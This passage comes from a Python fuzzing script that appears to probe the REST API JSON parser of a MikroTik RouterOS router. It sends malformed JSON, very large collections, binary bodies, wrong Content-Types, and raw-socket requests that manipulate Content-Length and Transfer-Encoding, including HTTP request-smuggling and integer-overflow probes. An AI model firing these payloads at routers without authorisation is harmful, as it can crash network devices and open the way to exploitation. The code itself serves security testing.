         "Bare JSON number at top level (not in object)"),

        ("just_value_null",
         b'null',
         "Bare null at top level (not in object)"),

        ("just_value_true",
         b'true',
         "Bare boolean at top level (not in object)"),

        ("multiple_top_level",
         b'{"a":"1"}{"b":"2"}',
         "Two JSON objects concatenated — multiple top-level values"),

        ("json_with_js_comments_line",
         b'{"note":"test"} // comment',
         "JSON followed by JavaScript line comment"),

        ("json_with_js_comments_block",
         b'{"note":/* comment */"test"}',
         "JavaScript block comment embedded in JSON"),

        ("json_with_hash_comment",
         b'# comment\n{"note":"test"}',
         "Hash comment before JSON body"),
    ]

    for name, payload, desc in tests:
        run_test("malformed_json", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 8f: Large Collections (~8 tests)
# =============================================================================

def test_large_collections():
    log("=" * 70)
    log("Category 8f: Large Collections (arrays/objects)")
    log("=" * 70)

    uptime = get_uptime()

    # Large arrays
    for count in [100, 1000, 10000]:
        elements = ",".join(str(i) for i in range(count))
        payload = ('{"note":"test","data":[' + elements + ']}').encode("utf-8")
        name = f"large_array_{count}"
        desc = f"JSON with array of {count} integer elements"
        run_test("large_collections", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()

    # Large array of strings
    for count in [1000, 5000]:
        elements = ",".join(f'"s{i}"' for i in range(count))
        payload = ('{"data":[' + elements + ']}').encode("utf-8")
        name = f"large_string_array_{count}"
        desc = f"JSON with array of {count} string elements"
        run_test("large_collections", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()

    # Large array of empty objects
    for count in [1000, 5000]:
        elements = ",".join("{}" for _ in range(count))
        payload = ('{"data":[' + elements + ']}').encode("utf-8")
        name = f"large_empty_obj_array_{count}"
        desc = f"JSON with array of {count} empty objects"
        run_test("large_collections", name, desc, payload, timeout=30, pre_uptime=uptime)
        uptime = get_uptime()

    # Single object with extremely many empty-value keys
    many = ",".join(f'"k{i}":""' for i in range(10000))
    payload = ("{" + many + "}").encode("utf-8")
    run_test("large_collections", "many_empty_values_10000",
             "JSON object with 10000 keys, all with empty string values",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()

    # Large array of null values
    payload = ('{"data":[' + ",".join("null" for _ in range(10000)) + ']}').encode("utf-8")
    run_test("large_collections", "large_null_array_10000",
             "JSON with array of 10000 null values",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()

    # Large array of booleans
    payload = ('{"data":[' + ",".join("true" if i % 2 == 0 else "false" for i in range(10000)) + ']}').encode("utf-8")
    run_test("large_collections", "large_bool_array_10000",
             "JSON with array of 10000 alternating true/false values",
             payload, timeout=30, pre_uptime=uptime)
    uptime = get_uptime()

    # Nested array of arrays
    inner = "[1,2,3]"
    elements = ",".join(inner for _ in range(1000))
    payload = ('{"data":[' + elements + ']}').encode("utf-8")
    run_test("large_collections", "nested_arrays_1000x3",
             "JSON with 1000 sub-arrays of 3 elements each (3000 total elements)",
             payload, timeout=30, pre_uptime=uptime)


# =============================================================================
# Category 8g: Binary / Non-JSON Bodies (~8 tests)
# =============================================================================

def test_binary_bodies():
    log("=" * 70)
    log("Category 8g: Binary / Non-JSON Bodies")
    log("=" * 70)

    uptime = get_uptime()

    tests = [
        ("all_zeros",
         b'\x00' * 100,
         "100 bytes of 0x00 as body"),

        ("all_ff",
         b'\xff' * 100,
         "100 bytes of 0xFF as body"),

        ("random_binary",
         bytes(range(256)),
         "All 256 byte values (0x00-0xFF) as body"),

        ("elf_header",
         b'\x7fELF\x02\x01\x01\x00' + b'\x00' * 100,
         "ELF binary header as body (test for magic number handling)"),

        ("gzip_header",
         b'\x1f\x8b\x08\x00' + b'\x00' * 100,
         "Gzip header as body (test for compression detection)"),

        ("xml_body",
         b'<?xml version="1.0"?><root><note>test</note></root>',
         "XML body with application/json Content-Type"),

        ("empty_body",
         b'',
         "Completely empty body (zero bytes)"),

        ("single_byte_bodies",
         b'{',
         "Single open brace as complete body"),
    ]

    for name, payload, desc in tests:
        run_test("binary_bodies", name, desc, payload, pre_uptime=uptime)
        uptime = get_uptime()


# =============================================================================
# Category 9: Multiple/Wrong Content-Types (~10 tests)
# =============================================================================

def test_content_types():
    log("=" * 70)
    log("Category 9: Content-Type Handling")
    log("=" * 70)

    uptime = get_uptime()
    valid_json = b'{"note":"ct_test"}'

    single_ct_tests = [
        ("text_plain",          "text/plain"),
        ("text_html",           "text/html"),
        ("text_xml",            "text/xml"),
        ("app_xml",             "application/xml"),
        ("form_urlencoded",     "application/x-www-form-urlencoded"),
        ("multipart_formdata",  "multipart/form-data; boundary=----Boundary"),
        ("octet_stream",        "application/octet-stream"),
        ("empty_content_type",  ""),
    ]

    for name, ct in single_ct_tests:
        desc = f"POST valid JSON with Content-Type: {ct!r} instead of application/json"
        run_test("content_type", f"wrong_ct_{name}", desc, valid_json,
                 content_type=ct, pre_uptime=uptime)
        uptime = get_uptime()

    # Multiple Content-Type headers via raw socket
    auth_hdr = build_basic_auth_header()
    body = b'{"note":"multi_ct_test"}'

    # Two Content-Type headers
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: text/plain\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    # Parse status code
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_type", "double_content_type_header",
        "POST with two Content-Type headers (text/plain then application/json) via raw socket",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 0 or status >= 500),
    )

    # Contradictory Content-Type: charset
    raw_req2 = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json; charset=utf-32\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes2, elapsed2 = send_raw_socket(raw_req2)
    resp_text2 = resp_bytes2.decode("utf-8", errors="replace")
    status2 = 0
    if resp_text2.startswith("HTTP/"):
        parts2 = resp_text2.split(" ", 2)
        if len(parts2) >= 2:
            try:
                status2 = int(parts2[1])
            except ValueError:
                pass

    ec.add_test(
        "content_type", "charset_utf32",
        "POST with Content-Type: application/json; charset=utf-32 (body is UTF-8)",
        f"HTTP {status2} | {elapsed2:.0f}ms",
        {"status": status2, "response": trunc(resp_text2), "elapsed_ms": round(elapsed2, 1)},
        anomaly=(status2 == 0 or status2 >= 500),
    )


# =============================================================================
# Category 10: Body/Content-Length Issues (~10 tests)
# =============================================================================

def test_content_length():
    log("=" * 70)
    log("Category 10: Body/Content-Length Issues")
    log("=" * 70)

    uptime = get_uptime()
    auth_hdr = build_basic_auth_header()
    body = b'{"note":"cl_test"}'

    # ── 10a: No Content-Length header ────────────────────────────────────────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_length", "no_content_length",
        "POST without Content-Length header (body appended after headers)",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 0 or status >= 500),
    )

    # ── 10b: Content-Length = 0 but body present ────────────────────────────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_length", "cl_zero_with_body",
        "POST with Content-Length: 0 but JSON body appended",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 0 or status >= 500),
    )

    # ── 10c: Content-Length smaller than actual body ────────────────────────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: 5\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_length", "cl_too_small",
        f"POST with Content-Length: 5 but body is {len(body)} bytes — truncated read",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "actual_body_len": len(body),
         "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 0 or status >= 500),
    )

    # ── 10d: Content-Length larger than actual body ─────────────────────────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: 99999\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req, timeout=8)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_length", "cl_too_large",
        "POST with Content-Length: 99999 but body is only 18 bytes — server hangs waiting?",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 0 or status >= 500),
    )

    # ── 10e: Extremely large Content-Length (overflow) ──────────────────────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: 99999999999999999999\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req, timeout=8)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    is_anomaly = (status == 0 or status >= 500)
    ec.add_test(
        "content_length", "cl_integer_overflow",
        "POST with Content-Length: 99999999999999999999 (integer overflow attempt)",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=is_anomaly,
    )
    if is_anomaly and status >= 500:
        ec.add_finding(
            "HIGH",
            "Content-Length integer overflow causes server error",
            "Sending an extremely large Content-Length value causes HTTP 5xx — "
            "possible integer overflow in www binary HTTP parser",
            cwe="CWE-190",
        )

    # ── 10f: Negative Content-Length ────────────────────────────────────────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: -1\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req, timeout=8)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_length", "cl_negative",
        "POST with Content-Length: -1 — signed/unsigned confusion test",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 0 or status >= 500),
    )

    # ── 10g: Duplicate Content-Length headers (HTTP smuggling vector) ───────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_length", "duplicate_cl_headers",
        f"POST with two Content-Length headers ({len(body)} and 0) — request smuggling vector",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 200 or status == 201),
    )

    # ── 10h: Transfer-Encoding: chunked ────────────────────────────────────
    chunk_body = f"{len(body):x}\r\n".encode() + body + b"\r\n0\r\n\r\n"
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    ).encode() + chunk_body

    resp_bytes, elapsed = send_raw_socket(raw_req)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_length", "transfer_encoding_chunked",
        "POST with Transfer-Encoding: chunked instead of Content-Length",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 0 or status >= 500),
    )

    # ── 10i: Both Content-Length and Transfer-Encoding (smuggling) ─────────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
    ).encode() + chunk_body

    resp_bytes, elapsed = send_raw_socket(raw_req)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    is_anomaly = (status in [200, 201])
    ec.add_test(
        "content_length", "cl_and_te_smuggling",
        "POST with BOTH Content-Length and Transfer-Encoding: chunked — HTTP smuggling test",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=is_anomaly,
    )
    if is_anomaly:
        ec.add_finding(
            "MEDIUM",
            "Server accepts both Content-Length and Transfer-Encoding",
            "The www binary processes requests with both CL and TE headers, "
            "which is a precondition for HTTP request smuggling (CL.TE or TE.CL)",
            cwe="CWE-444",
        )

    # ── 10j: Content-Length with non-numeric value ─────────────────────────
    raw_req = (
        f"POST {REST_ENDPOINT} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"{auth_hdr}\r\n"
        f"Content-Type: application/json\r\n"
        f"Content-Length: abc\r\n"
        f"\r\n"
    ).encode() + body

    resp_bytes, elapsed = send_raw_socket(raw_req, timeout=8)
    resp_text = resp_bytes.decode("utf-8", errors="replace")
    status = 0
    if resp_text.startswith("HTTP/"):
        parts = resp_text.split(" ", 2)
        if len(parts) >= 2:
            try:
                status = int(parts[1])
            except ValueError:
                pass

    ec.add_test(
        "content_length", "cl_non_numeric",
        "POST with Content-Length: abc (non-numeric) — input validation test",
        f"HTTP {status} | {elapsed:.0f}ms",
        {"status": status, "response": trunc(resp_text), "elapsed_ms": round(elapsed, 1)},
        anomaly=(status == 0 or status >= 500),
    )


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 70)
    log("MikroTik RouterOS CHR 7.20.8 — JSON Parser Deep Fuzzing")
    log(f"Target: {TARGET}:{PORT}")
    log(f"Endpoint: {REST_ENDPOINT}")
    log(f"Timestamp: {datetime.now().isoformat()}")
    log("=" * 70)

    # Pre-flight check
    health = check_health()
    if not health.get("alive"):
        log("FATAL: Router at %s is not responding. Aborting." % TARGET)
        sys.exit(1)
    log(f"Router alive: version={health.get('version')}, uptime={health.get('uptime')}, "
        f"cpu={health.get('cpu_load')}%, free_mem={health.get('free_memory')}")

    try:
        test_deep_nesting()          # 16 tests
        test_long_strings()          # 9 tests
        test_long_keys()             # 7 tests
        test_unicode_edge_cases()    # 21 tests
        test_number_boundaries()     # 27 tests
        test_truncated_json()        # 13 tests
        test_type_confusion()        # 12 tests
        test_null_bytes()            # 9 tests
        test_escape_sequences()      # 12 tests
        test_duplicate_keys()        # 6 tests
        test_whitespace_abuse()      # 10 tests
        test_malformed_structures()  # 19 tests
        test_large_collections()     # 11 tests
        test_binary_bodies()         # 8 tests
        test_content_types()         # 10 tests
        test_content_length()        # 10 tests

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Final health check
        log("=" * 70)
        log("Final health check")
        log("=" * 70)
        final = check_health()
        if final.get("alive"):
            log(f"Router OK: version={final.get('version')}, "
                f"uptime={final.get('uptime')}, cpu={final.get('cpu_load')}%")
        else:
            log("WARNING: Router is not responding at end of test!")

        # Save evidence
        ec.save("attack_www_json.json")
        ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
